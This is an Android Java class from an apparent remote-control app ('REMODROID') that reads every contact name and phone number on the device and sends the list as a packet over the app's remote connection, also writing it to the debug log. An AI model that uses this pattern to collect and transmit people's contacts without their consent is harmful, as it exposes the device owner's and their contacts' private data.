package com.remo.Features;

import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import com.remo.App;
import com.remo.Connections.DataHandler;
import com.remo.Connections.Feature;

import java.io.UnsupportedEncodingException;

public class Contacts extends Feature {

   public Contacts(){
       UseMainConnection = false;
       Feature_type = DataHandler.eDataType.CONTACTS.ordinal();
   }

    @Override
    public void AsyncTaskFunc(String Params) {
        //Log.d("REMODROID",getList(path));
        try {
            String toSend = getList();

            sendPacket(toSend.getBytes("UTF-8"));
            Log.d("REMODROID",toSend);
        } catch (UnsupportedEncodingException e) {
            Log.e("REMODROID","Contacts Exception");
        }
    }

    @Override
    public void update(String Params) {

    }


    private String getList(){
        StringBuilder sb = new StringBuilder();

        Cursor phones = App.get().getApplicationContext().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            sb.append(name);
            sb.append("/");
            sb.append(phoneNumber);
            sb.append("\\");

        }
        phones.close();
        return sb.toString();
    }
}